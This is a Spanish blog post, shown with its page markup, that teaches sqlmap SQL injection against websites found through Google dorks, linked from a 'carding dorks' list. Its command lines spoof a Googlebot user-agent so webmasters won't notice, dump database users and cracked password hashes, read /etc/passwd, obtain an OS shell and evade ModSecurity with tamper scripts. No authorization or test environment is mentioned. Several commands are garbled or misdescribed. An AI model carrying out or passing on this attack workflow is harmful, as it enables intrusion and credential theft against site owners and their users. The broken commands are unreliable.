<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Uso avanzado de sqlmap - sql injection" /><meta property="og:locale" content="es" /><meta name="description" content="SQL(map) INJECTION" /><meta property="og:description" content="SQL(map) INJECTION" /><link rel="canonical" href="https://sstandby.github.io/posts/sql-map/" /><meta property="og:url" content="https://sstandby.github.io/posts/sql-map/" /><meta property="og:site_name" content="Standby" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-12-29T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Uso avanzado de sqlmap - sql injection" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"SQL(map) INJECTION","url":"https://sstandby.github.io/posts/sql-map/","headline":"Uso avanzado de sqlmap - sql injection","@type":"BlogPosting","dateModified":"2021-10-20T17:30:34+00:00","datePublished":"2018-12-29T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://sstandby.github.io/posts/sql-map/"},"@context":"https://schema.org"}</script><title>Uso avanzado de sqlmap - sql injection | Standby</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Standby"><meta name="application-name" content="Standby"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/icon/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Standby</a></div><div class="site-subtitle font-italic">Linux ~ Programming ~ Pentesting</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Sstandby" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Uso avanzado de sqlmap - sql injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Uso avanzado de sqlmap - sql injection</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Standby </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 29, 2018, 12:00 AM +0000" >Dec 29, 2018<i class="unloaded">2018-12-29T00:00:00+00:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 20, 2021, 12:30 PM -0500" >Oct 20<i class="unloaded">2021-10-20T17:30:34+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1139 words">6 min read</span></div></div><div class="post-content"><h2 id="que-es-sqlmap">¿Que es SQLMAP?</h2><hr /><p>Es una herramienta desarrollada en el lenguaje de programación Python y sirve para hacer SQL injection automatizado en otras palabras aprovecha las vulnerabilidades de inyección SQL en aplicaciones web en la cual se puede llegar hacer distintas cosas, por ejemplo:</p><ul><li>Enumerar bases de datos<li><p>Enumerar las tablas y columnas de una base de datos.</p><li><p>Enumerar los usuarios con su respectiva contraseña.</p><li><p>Descifrar los hashes de contraseñas .</p><li>Leer archivos específicos del sistema de archivo de un host especifico y mucha mas cosas.</ul><p><img data-proofer-ignore data-src="/assets/img/post/04/sqlmap.png" alt="sqlmap" /></p><h3 id="uso-practico">Uso practico</h3><hr /><p>Para empezar tenemos que elegír una Dork aquí les dejare unas 2k+ de Dorks de Google <a href="https://itechhacks.com/latest-fresh-carding-dorks-2016/">Dorks</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">-D</span> privacidaddb <span class="nt">--tables</span> <span class="nt">--user-agent</span><span class="o">=</span><span class="s2">"Mozilla 5 (compatible , Googlebot/2.1, [http://www.google.com/bot.html)"</span><span class="o">](</span>https://www.google.com/bot.html<span class="o">)</span>
</pre></table></code></div></div><p>Comenzamos con este código antes de comenzar con lo más emocionante por decirlo así, pero la pregunta es: ¿Para qué sirve esto? Este comando sirve para camuflar nuestra conexión como un robot de google ya que siempre esta vigente a las conecciones vigentes de inicio ¿Que pasa si no hacemos esto? Simplemente dejarias a descubierto la conexion que estamos conectados de una manera textual y el web master se dara cuenta que estamos inyectando su web y hasta puede saber que programa estamos usando, etc.</p><h3 id="obtener-datos-del-usuario-de-la-web">Obtener datos del usuario de la web</h3><hr /><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--current-user</span>
</pre></table></code></div></div><p>Ahora comprobemos si es correcto el usuario que tenemos de la base de datos</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--is-dba</span> <span class="nt">--current-db</span> 
</pre></table></code></div></div><p>Para ver los privilegios de administradores activados</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--privileges</span><span class="k">**</span>  
</pre></table></code></div></div><p>Para obtener todos los usuarios de DBS</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--users</span>
</pre></table></code></div></div><p>Podremos ver en donde corre y que usuario está alojado puede ser root u otro</p><p>Para obtener las contraseñas de los usuarios de las dbs</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--password</span>
</pre></table></code></div></div><p>Nos saldrá un mensaje con unas opciones y tendremos que elegir según las letras [“Y” , “N”, “Q”] ¿Por que sale esto? porque las contraseñas de los registros de las bases de datos se codifican automáticamente en Hash y en MD5 son las más conocidas, en fin…</p><ul><li><p>Y = Es para hacer un ataque de fuerza bruta para descifrar el hash</p><li><p>N = Es para negar la anterior opción y obtener solo la hash</p><li><p>Q = Para terminar el proceso hasta ese momento</p></ul><p>Ponemos Q y luego nos saldrán 3 opciones y escogemos el diccionario 1 /defauld</p><p>Después nos dará la siguiente información que es la contraseña crackeada y el usuario. También podemos hacer una búsqueda más avanzada pero tenemos que tener en cuenta de como usar los nombres en las búsquedas</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">-C</span> login <span class="nt">--search</span><span class="k">**</span>  
</pre></table></code></div></div><p>Nos saldrán dos opciones y elegiremos la primera que es para tener una lista opcional de la búsqueda nos permitirá hacer un dump de las columnas encontradas en la DBS ponemos la opción “a” ¿Por que? esto hará un dump general</p><h3 id="obtener-información-de-la-web">Obtener información de la web:</h3><hr /><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--dbs</span> <span class="nt">-u</span> <span class="o">=</span> Target UR <span class="o">(</span>e.g. “http://www.example.com/cgi-bin/item.cgi?item_id<span class="o">=</span>15<span class="s2">" --dbs 
</span></pre></table></code></div></div><p>Sigamos revisando la base de datos</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">-D</span> <span class="o">[</span>Ponemos aquí lo que hayas seleccionado de la tabla] --tables  
</pre></table></code></div></div><p>Después nos saldrá otra tabla usaremos otro comando, pero explicare que las letras en mayúscula, por ejemplo, -D son abreviadas, porque -D es el nombre de la base de datos, o sea <strong>–dbs</strong> recuerda que siempre deben ir en mayúscula <strong>-T</strong> es <strong>–tables</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">-D</span> <span class="o">[</span>Ponemos aquí lo que hayas seleccionado de la tabla] <span class="nt">-T</span> <span class="o">[</span>Ponemos aquí lo que hayas seleccionado de la tabla siguiente] <span class="nt">--columns</span>
</pre></table></code></div></div><p>Ahora que tenemos las columnas visibles vamos a extraer datos de una tabla</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--dump</span> <span class="nt">-D</span> <span class="o">[</span>Ponemos aquí lo que hayas seleccionado de la tabla] <span class="nt">-T</span> <span class="o">[</span>Ponemos aquí lo que hayas seleccionado de la tabla siguiente]  
</pre></table></code></div></div><p>Nos puede salir algo similar a esto:</p><div class="table-wrapper"><table><thead><tr><th>id<th>hash<th>nombre<th>correo electrónico<th>contraseña<th>permiso<th>inicio_sistema<th>system_allow_only<tbody><tr><td>1<td>5DIpzzDHFOwnCvPonu<td>admin<td>En blanco<td><en blanco=""></en><td>3<td>En blanco<td>En blanco</table></div><p>Usemos otro comando hasta ahora hemos tenido mucha información de la tabla. La columna hash parece tener el hash de contraseña puede descifrarlo y obtener los datos para iniciar sesión lo que hará slqmap es crear un archivo csv que tendrá los datos volcados para facilitar el análisis</p><p>En el siguiente comando se usará para tener el banner exacto del servidor de la base de datos cuando nos salga el banner de mysql nos mostrará la versión mysql que se ha estado usando cuando tengas la versión buscamos en google una vulnerabilidad de MySQL a esa versión que tenemos</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">-b</span>
</pre></table></code></div></div><p>Para leer un archivo de sistema tenemos que tener permisos para la operación de ARCHiVO los unico que podemos leer son los archivos legibles o legibles por el usuario de mysql, por ejemplo:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--file-read</span> <span class="o">=</span> / etc / passwd <span class="nt">--threads</span> <span class="o">=</span> 10
</pre></table></code></div></div><p>Solo es ejemplo, pero ¿Qué estamos haciendo? Sqlmap alamencera el archivo en nuestro directorio para que podamos leerlo después</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--sql-query</span> <span class="o">=</span> <span class="s2">"seleccionar ahora ();"</span>
</pre></table></code></div></div><p>Lo que hicimos fue ejecutar el comando sql arbitrario el cual sirve para ejecutar consultas sql arbitrarias en la base de datos</p><h3 id="comandos-curiosos">Comandos curiosos</h3><hr /><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--fingerprint</span> <span class="nt">-random-agent</span>
</pre></table></code></div></div><p>-u: URL</p><p>–fingerprint: Captura el flag arg para analizar</p><p>–random-agent: Pide el navegador por defecto**</p><p>Definir el parámetro a explotar</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--dbs</span> <span class="nt">-p</span> param2
</pre></table></code></div></div><p>Si la url tiene URI´s bonitas</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-u</span> <span class="s2">"http://XXXXXXXXXXX/detail/code/value1*/param2/value2"</span> <span class="nt">--dbs</span>
</pre></table></code></div></div><p>Ejecutar consultas directametne</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">-D</span> <span class="s2">"BASEDEDATOS"</span> <span class="nt">--sql-query</span> <span class="s2">"SELECT * FROM TABLAS;"</span>
</pre></table></code></div></div><p>Conseguir Shell del sistema si es que es viable</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--os-shell</span><span class="k">**</span>  
</pre></table></code></div></div><h3 id="evadiendo-el-mod_security-con-tampers-de-sqlmap">Evadiendo el Mod_Security con Tampers de sqlmap</h3><hr /><p>Alguna vez cuando hacemos inyección por GET en alguna web a veces nos aparece un anuncio de Mod_Security al cual no deja inyectar, pero usando sqlmap y con sus Tampers podremos sacarnos de este apuro. Puedes encontrar información de cada Tamper cada archivo tiene su explicación de su funcionalidad solo tiene que ir a sqlmap/tamper/</p><h3 id="cómo-usamos-tamper-en-sqlmap">¿Cómo usamos Tamper en SQLMAP?</h3><hr /><p>Es fácil solo se debe utilizar el siguiente comando o agregar la opción</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">--tamper</span> <span class="o">[</span>Nombre del Tamper]<span class="k">**</span>  
</pre></table></code></div></div><p>En otras palabras:</p><p><img data-proofer-ignore data-src="/assets/img/post/04/tampers.png" alt="tampers" /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap.py <span class="nt">-u</span> <span class="o">[</span>URL] <span class="nt">--dbms</span> <span class="s2">"MySQL"</span> <span class="nt">-p</span> <span class="o">[</span>marca_id] <span class="nt">--tamper</span> <span class="s2">"modsecurityzeroversioned.py"</span> <span class="nt">--batch</span>
</pre></table></code></div></div><p>Ahora que sabemos esto de evadir los filtros y los WAF, gracias a la herramienta qué carga las reglas del script de sabotaje para lo mencionado, pero sabías que podemos usar todos en una línea? Ejemplo:</p><h3 id="bajar-la-clase-de-seguridad-y-mas">Bajar la clase de seguridad y mas</h3><p>Podemos hacer otro ataque en donde haremos un escaneo de la URL vereficando las cookies y a lo último hace un string para poder ver la base de datos y no solo también podremos bajar la clase de seguridad de la página, pero espera antes necesitamos dos cosas URL y cookie podemos obtener esta información con BurpSuite y después usar sqlmap digamos que ya tenemos eso, pero y ahora que? Simplemente ya podemos usar el siguiente comando:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'[URL]'</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'[cookie]'</span> <span class="nt">--string</span><span class="o">=</span>Surname <span class="nt">--dbs</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting/'>Pentesting</a>, <a href='/categories/herramientas/'>Herramientas</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sql/" class="post-tag no-text-decoration" >SQL</a> <a href="/tags/injection/" class="post-tag no-text-decoration" >Injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Uso avanzado de sqlmap - sql injection - Standby&url=https://sstandby.github.io/posts/sql-map/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Uso avanzado de sqlmap - sql injection - Standby&u=https://sstandby.github.io/posts/sql-map/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Uso avanzado de sqlmap - sql injection - Standby&url=https://sstandby.github.io/posts/sql-map/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/JS-C4/">Curso de JavaScript 4</a><li><a href="/posts/spider-file/">Encuentra posibles vulnerabilidades y urga por los directorios o ficheros.</a><li><a href="/posts/Incognito/">Historial de Incognito</a><li><a href="/posts/sql-map/">Uso avanzado de sqlmap - sql injection</a><li><a href="/posts/xss/">¡Explotando webs con XSS!</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/javascript/">JavaScript</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cursos/">Cursos</a> <a class="post-tag" href="/tags/injection/">Injection</a> <a class="post-tag" href="/tags/batch/">Batch</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/termux/">termux</a> <a class="post-tag" href="/tags/windows/">Windows</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/hts-two/"><div class="card-body"> <span class="timeago small" >Feb 2, 2019<i class="unloaded">2019-02-02T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Misión realista 2. Hackeando sitio.</h3><div class="text-muted small"><p> De: DestroyFascism Message: Me informaron que tienes habilidades de hacking bastante admirables. Bueno, este grupo de odio racista está utilizando su sitio web para organizar una reunión masiva d...</p></div></div></a></div><div class="card"> <a href="/posts/A25V/"><div class="card-body"> <span class="timeago small" >Dec 29, 2018<i class="unloaded">2018-12-29T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analizar una vulnerabilidad de un sitio web SSL</h3><div class="text-muted small"><p> Hoy les vengo a traer una herramienta en la cual podrán hacer escaneos de vulnerabilidades SSL, HeartBleed, CCS injection, SSLv3, POODLE, entre otras más. Recomiendo la herramienta, porque me par...</p></div></div></a></div><div class="card"> <a href="/posts/xss/"><div class="card-body"> <span class="timeago small" >Dec 29, 2018<i class="unloaded">2018-12-29T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>¡Explotando webs con XSS!</h3><div class="text-muted small"><p> Les recomiendo estos dos blogs antes de comenzar: JavaScript, HTML. En este curso primero veremos xss y luego abarcaremos a otros temas. Primero aprenderemos a caminar para después volar. Veremo...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/JS-FB/" class="btn btn-outline-primary" prompt="Older"><p>Sacando información con JavaScript</p></a> <a href="/posts/xss/" class="btn btn-outline-primary" prompt="Newer"><p>¡Explotando webs con XSS!</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/Sstandby">Standby</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/javascript/">JavaScript</a> <a class="post-tag" href="/tags/ctf/">CTF</a> 